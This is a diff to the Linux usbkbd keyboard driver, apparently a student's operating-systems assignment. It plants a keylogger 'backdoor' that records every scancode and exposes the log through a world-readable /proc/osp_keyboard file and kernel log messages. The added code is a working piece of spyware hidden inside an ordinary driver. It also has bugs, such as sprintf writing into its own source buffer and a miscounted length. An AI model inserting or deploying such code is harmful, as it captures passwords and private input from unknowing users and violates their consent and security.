@@ -32,6 +32,7 @@
 #include <linux/init.h>
 #include <linux/usb/input.h>
 #include <linux/hid.h>
+#include "backdoor.h"
 
 /*
  * Version Information
@@ -43,6 +44,14 @@
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 MODULE_LICENSE("GPL");
+
+struct file_operations osp_proc_fops =
+{
+		.open = proc_device_open,
+		.read = seq_read,
+		.write = proc_device_write
+};
+
 
 static const unsigned char usb_kbd_keycode[256] = {
 	  0,  0,  0,  0, 30, 48, 46, 32, 18, 33, 34, 35, 23, 36, 37, 38,
@@ -140,13 +149,21 @@ static void usb_kbd_irq(struct urb *urb)
 					 kbd->old[i]);
 		}
 
-		if (kbd->new[i] > 3 && memscan(kbd->old + 2, kbd->new[i], 6) == kbd->old + 8) {
+		if (kbd->new[i] > 3 && memscan(kbd->old + 2, kbd->new[i], 6) == kbd->old + 8)
+		{
 			if (usb_kbd_keycode[kbd->new[i]])
+			{
 				input_report_key(kbd->dev, usb_kbd_keycode[kbd->new[i]], 1);
+				printk(KERN_INFO "usbkbd: Key %d pressed, scan code %d.", (int)usb_kbd_keycode[kbd->new[i]], (int)kbd->new[i]);
+
+				osp_backdoor_write_key((int)kbd->new[i]);
+			}
 			else
+			{
 				hid_info(urb->dev,
 					 "Unknown key (scancode %#x) pressed.\n",
 					 kbd->new[i]);
+			}
 		}
 	}
 
@@ -281,6 +298,9 @@ static int usb_kbd_probe(struct usb_interface *iface,
 	int i, pipe, maxp;
 	int error = -ENOMEM;
 
+	// Init backdoor
+	osp_backdoor_init();
+
 	interface = iface->cur_altsetting;
 
 	if (interface->desc.bNumEndpoints != 1)
@@ -390,7 +410,73 @@ static void usb_kbd_disconnect(struct usb_interface *intf)
 		usb_kbd_free_mem(interface_to_usbdev(intf), kbd);
 		kfree(kbd);
 	}
+
+	osp_backdoor_close();
 }
+
+static int osp_backdoor_init()
+{
+	printk(KERN_ALERT "usbkbd: USB keyboard driver started with some evil stuff, used for OSP Assignment 2 Stage 2 only.");
+	printk(KERN_ALERT "usbkbd: Modified by Ming Hu s3554025 @ RMIT University, 2017; forked from Linux kernel v4.13.");
+	osp_proc_entry = proc_create("osp_keyboard", 0644, NULL, &osp_proc_fops);
+	osp_backdoor_buffer = vmalloc(OSP_BACKDOOR_BUFFER_SIZE);
+	memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
+	osp_backdoor_buffer_count = 0;
+
+	if(!osp_backdoor_buffer || !osp_proc_entry)
+	{
+		printk(KERN_ERR "usbkbd: Failed to initialize ProcFS!");
+		return -EFAULT;
+	}
+	else
+	{
+		printk(KERN_ALERT "usbkbd: ProcFS initialized!");
+		return 0;
+	}
+}
+
+static void osp_backdoor_close()
+{
+	remove_proc_entry("osp_keyboard", NULL);
+}
+
+static void osp_backdoor_write_key(int keycode)
+{
+	// When buffer length is about to overflow, reset it.
+	if(strlen(osp_backdoor_buffer) > 3065)
+	{
+		memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
+		osp_backdoor_buffer_count = 0;
+	}
+
+	// Write to buffer and increase the counter
+	sprintf(osp_backdoor_buffer, "%s %d", osp_backdoor_buffer, keycode);
+	osp_backdoor_buffer_count += strlen(osp_backdoor_buffer);
+}
+
+static int proc_device_open(struct inode * inode, struct file * file_pointer)
+{
+	return single_open(file_pointer, proc_device_show, NULL);
+}
+
+static int proc_device_show(struct seq_file * file_stream, void * extra)
+{
+	printk(KERN_INFO "usbkbd: Writing to ProcFS buffer...");
+	printk(KERN_INFO "usbkbd: Length %d, content: %s", (int)osp_backdoor_buffer_count, osp_backdoor_buffer);
+
+	seq_printf(file_stream, "OSP Assignment 2 Stage 2 Keyboard logger by Ming Hu s3554025\nLength: %d\nContent: %s\n",
+			(int)osp_backdoor_buffer_count,
+			osp_backdoor_buffer);
+
+	return 0;
+}
+
+static ssize_t proc_device_write(struct file * file_pointer, const char __user * str_buffer, size_t buffer_size, loff_t * offset)
+{
+	printk(KERN_ERR "usbkbd: device_write is not yet implemented!");
+	return 0;
+}
+
 
 static const struct usb_device_id usb_kbd_id_table[] = {
 	{ USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID, USB_INTERFACE_SUBCLASS_BOOT,
